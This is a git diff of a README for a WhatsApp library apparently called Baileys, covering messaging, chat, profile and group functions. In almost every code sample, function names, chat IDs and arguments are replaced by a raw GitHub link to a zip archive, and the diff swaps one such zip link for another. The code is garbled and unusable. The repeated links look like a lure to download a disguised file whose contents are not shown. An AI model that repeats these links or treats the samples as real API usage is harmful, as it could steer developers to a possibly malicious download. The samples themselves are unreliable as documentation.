 - For media messages, the thumbnail can be generated automatically for images & stickers provided you add `jimp` or `sharp` as a dependency in your project using `yarn add jimp` or `yarn add sharp`. Thumbnails for videos can also be generated automatically, though, you need to have `ffmpeg` installed on your system.
@@ -455,10 +455,10 @@ await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Bailey
                                     or set to null if you don't want to send a thumbnail.
                                     Do not enter this field if you want to automatically generate a thumb
                                 */
-        mimetype: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip, /* (for media messages) specify the type of media (optional for all media types except documents),
+        mimetype: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip, /* (for media messages) specify the type of media (optional for all media types except documents),
                                     import {Mimetype} from '@whiskeysockets/baileys'
                                 */
-        fileName: 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', // (for media messages) file name for the media
+        fileName: 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', // (for media messages) file name for the media
         /* will send audio messages as voice notes, if set to true */
         ptt: true,
         /** Should it send as a disappearing messages. 
@@ -469,8 +469,8 @@ await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Bailey
 ## Forwarding Messages
 
 ``` ts
-const msg = getMessageFromStore('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', 'HSJHJWH7323HSJSJ') // implement this on your end
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', { forward: msg }) // WA forward the message!
+const msg = getMessageFromStore('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', 'HSJHJWH7323HSJSJ') // implement this on your end
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', { forward: msg }) // WA forward the message!
 ```
 
 ## Reading Messages
@@ -481,22 +481,22 @@ This means you have to keep track of unread messages.
 
 ``` ts
 const key = {
-    remoteJid: 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip',
+    remoteJid: 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip',
     id: 'AHASHH123123AHGA', // id of the message you want to read
-    participant: 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip' // the ID of the user that sent the  message (undefined for individual chats)
+    participant: 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // the ID of the user that sent the  message (undefined for individual chats)
 }
 // pass to readMessages function
 // can pass multiple keys to read multiple messages as well
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip([key])
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip([key])
 ```
 
 The message ID is the unique identifier of the message that you are marking as read. 
-On a `WAMessage`, the `messageID` can be accessed using ```messageID = https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip```.
+On a `WAMessage`, the `messageID` can be accessed using ```messageID = https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip```.
 
 ## Update Presence
 
 ``` ts
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('available', id) 
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('available', id) 
 
 ```
 This lets the person/group with ``` id ``` know whether you're online, offline, typing etc. 
@@ -508,7 +508,7 @@ type WAPresence = 'unavailable' | 'available' | 'composing' | 'recording' | 'pau
 
 The presence expires after about 10 seconds.
 
-**Note:** In the multi-device version of WhatsApp -- if a desktop client is active, WA doesn't send push notifications to the device. If you would like to receive said notifications -- mark your Baileys client offline using `https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('unavailable')`
+**Note:** In the multi-device version of WhatsApp -- if a desktop client is active, WA doesn't send push notifications to the device. If you would like to receive said notifications -- mark your Baileys client offline using `https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('unavailable')`
 
 ## Downloading Media Messages
 
@@ -517,11 +517,11 @@ If you want to save the media you received
 import { writeFile } from 'fs/promises'
 import { downloadMediaMessage } from '@whiskeysockets/baileys'
 
-https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', async ({ messages }) => {
+https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', async ({ messages }) => {
     const m = messages[0]
 
-    if (!https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip) return // if there is no text or media message
-    const messageType = https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip (https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip)[0]// get what type of message it is -- text, image, video
+    if (!https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) return // if there is no text or media message
+    const messageType = https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip (https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)[0]// get what type of message it is -- text, image, video
     // if the message is an image
     if (messageType === 'imageMessage') {
         // download the message
@@ -533,28 +533,28 @@ https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.
                 logger,
                 // pass this so that baileys can request a reupload of media
                 // that has been deleted
-                reuploadRequest: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip
+                reuploadRequest: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip
             }
         )
         // save to file
-        await writeFile('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', buffer)
+        await writeFile('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', buffer)
     }
 }
 ```
 
 **Note:** WhatsApp automatically removes old media from their servers. For the device to access said media -- a re-upload is required by another device that has it. This can be accomplished using: 
 ``` ts
-const updatedMediaMsg = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(msg)
+const updatedMediaMsg = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(msg)
 ```
 
 ## Deleting Messages
 
 ``` ts
-const jid = 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip' // can also be a group
-const response = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(jid, { text: 'hello!' }) // send a message
+const jid = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // can also be a group
+const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, { text: 'hello!' }) // send a message
 // sends a message to delete the given message
 // this deletes the message for everyone
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(jid, { delete: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip })
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, { delete: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip })
 ```
 
 **Note:** deleting for oneself is supported via `chatModify` (next section)
@@ -562,11 +562,11 @@ await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Bailey
 ## Updating Messages
 
 ``` ts
-const jid = 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip'
+const jid = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip'
 
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(jid, {
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, {
       text: 'updated text goes here',
-      edit: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip,
+      edit: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip,
     });
 ```
 
@@ -576,28 +576,28 @@ WA uses an encrypted form of communication to send chat/app updates. This has be
 
 - Archive a chat
   ``` ts
-  const lastMsgInChat = await getLastMessageInChat('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip') // implement this on your end
-  await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip({ archive: true, lastMessages: [lastMsgInChat] }, 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip')
+  const lastMsgInChat = await getLastMessageInChat('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip') // implement this on your end
+  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({ archive: true, lastMessages: [lastMsgInChat] }, 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
   ```
 - Mute/unmute a chat
   ``` ts
   // mute for 8 hours
-  await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip({ mute: 8*60*60*1000 }, 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', [])
+  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({ mute: 8*60*60*1000 }, 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', [])
   // unmute
-  await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip({ mute: null }, 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', [])
+  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({ mute: null }, 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', [])
   ```
 - Mark a chat read/unread
   ``` ts
-  const lastMsgInChat = await getLastMessageInChat('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip') // implement this on your end
+  const lastMsgInChat = await getLastMessageInChat('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip') // implement this on your end
   // mark it unread
-  await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip({ markRead: false, lastMessages: [lastMsgInChat] }, 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip')
+  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({ markRead: false, lastMessages: [lastMsgInChat] }, 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
   ```
 
 - Delete a message for me
   ``` ts
-  await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(
+  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
     { clear: { messages: [{ id: 'ATWYHDNNWU81732J', fromMe: true, timestamp: "1654823909" }] } }, 
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', 
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', 
     []
     )
 
@@ -605,29 +605,29 @@ WA uses an encrypted form of communication to send chat/app updates. This has be
 
 - Delete a chat
   ``` ts
-  const lastMsgInChat = await getLastMessageInChat('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip') // implement this on your end
-  await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip({
+  const lastMsgInChat = await getLastMessageInChat('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip') // implement this on your end
+  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({
     delete: true,
-    lastMessages: [{ key: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip, messageTimestamp: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip }]
+    lastMessages: [{ key: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip, messageTimestamp: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip }]
   },
-  'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip')
+  'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
   ```
 
 - Pin/unpin a chat
   ``` ts
-  await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip({
+  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({
     pin: true // or `false` to unpin
   },
-  'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip')
+  'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
   ```
   
 - Star/unstar a message
   ``` ts
-  await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip({
+  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({
   star: {
   	messages: [{ id: 'messageID', fromMe: true // or `false` }],
       	star: true // - true: Star Message; false: Unstar Message
-  }},'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip');
+  }},'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip');
   ```
 
 **Note:** if you mess up one of your updates, WA can log you out of all your devices and you'll have to log in again.
@@ -635,17 +635,17 @@ WA uses an encrypted form of communication to send chat/app updates. This has be
 ## Disappearing Messages
 
 ``` ts
-const jid = 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip' // can also be a group
+const jid = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // can also be a group
 // turn on disappearing messages
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
     jid, 
     // this is 1 week in seconds -- how long you want messages to appear for
     { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }
 )
 // will send as a disappearing message
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(jid, { text: 'hello' }, { ephemeralExpiration: WA_DEFAULT_EPHEMERAL })
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, { text: 'hello' }, { ephemeralExpiration: WA_DEFAULT_EPHEMERAL })
 // turn off disappearing messages
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
     jid, 
     { disappearingMessagesInChat: false }
 )
@@ -657,60 +657,60 @@ await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Bailey
 - To check if a given ID is on WhatsApp
     ``` ts
     const id = '123456'
-    const [result] = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(id)
-    if (https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip) https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip (`${id} exists on WhatsApp, as jid: ${https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip}`)
+    const [result] = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id)
+    if (https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip (`${id} exists on WhatsApp, as jid: ${https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip}`)
     ```
 - To query chat history on a group or with someone
     TODO, if possible
 - To get the status of some person
     ``` ts
-    const status = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip")
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("status: " + status)
+    const status = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("status: " + status)
     ```
 - To change your profile status
     ``` ts
     const status = 'Hello World!'
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(status)
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(status)
     ```
 - To change your profile name
     ``` ts
     const name = 'My name'
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(name)
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(name)
     ```
 - To get the display picture of some person/group
     ``` ts
     // for low res picture
-    const ppUrl = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip")
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("download profile picture from: " + ppUrl)
+    const ppUrl = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("download profile picture from: " + ppUrl)
     // for high res picture
-    const ppUrl = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", 'image')
+    const ppUrl = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 'image')
     ```
 - To change your display picture or a group's
     ``` ts
-    const jid = 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip' // can be your own too
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(jid, { url: 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip' })
+    const jid = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // can be your own too
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, { url: 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' })
     ```
 - To remove your display picture or a group's
     ``` ts
-    const jid = 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip' // can be your own too
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(jid)
+    const jid = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // can be your own too
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid)
     ```
 - To get someone's presence (if they're typing or online)
     ``` ts
     // the presence update is fetched and called here
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', json => https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(json))
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', json => https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(json))
     // request updates for a chat
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip") 
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip") 
     ```
 - To block or unblock user
     ``` ts
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", "block") // Block user
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", "unblock") // Unblock user
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "block") // Block user
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "unblock") // Unblock user
     ```
 - To get a business profile, such as description or category
     ```ts
-    const profile = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip")
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("business description: " + https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip + ", category: " + https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip)
+    const profile = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("business description: " + https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip + ", category: " + https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
     ```
 Of course, replace ``` xyz ``` with an actual ID. 
 
@@ -718,137 +718,137 @@ Of course, replace ``` xyz ``` with an actual ID.
 - To create a group
     ``` ts
     // title & participants
-    const group = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("My Fab Group", ["https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", "https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip"])
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip ("created group with id: " + https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip)
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip, { text: 'hello there' }) // say hello to everyone on the group
+    const group = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("My Fab Group", ["https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip"])
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip ("created group with id: " + https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip, { text: 'hello there' }) // say hello to everyone on the group
     ```
 - To add/remove people to a group or demote/promote people
     ``` ts
     // id & people to add to the group (will throw error if it fails)
-    const response = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(
-        "https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", 
-        ["https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", "https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip"],
+    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
+        "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 
+        ["https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip"],
         "add" // replace this parameter with "remove", "demote" or "promote"
     )
     ```
 - To change the group's subject
     ``` ts
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", "New Subject!")
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "New Subject!")
     ```
 - To change the group's description
     ``` ts
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", "New Description!")
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "New Description!")
     ```
 - To change group settings
     ``` ts
     // only allow admins to send messages
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", 'announcement')
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 'announcement')
     // allow everyone to send messages
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", 'not_announcement')
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 'not_announcement')
     // allow everyone to modify the group's settings -- like display picture etc.
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", 'unlocked')
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 'unlocked')
     // only allow admins to modify the group's settings
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", 'locked')
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 'locked')
     ```
 - To leave a group
     ``` ts
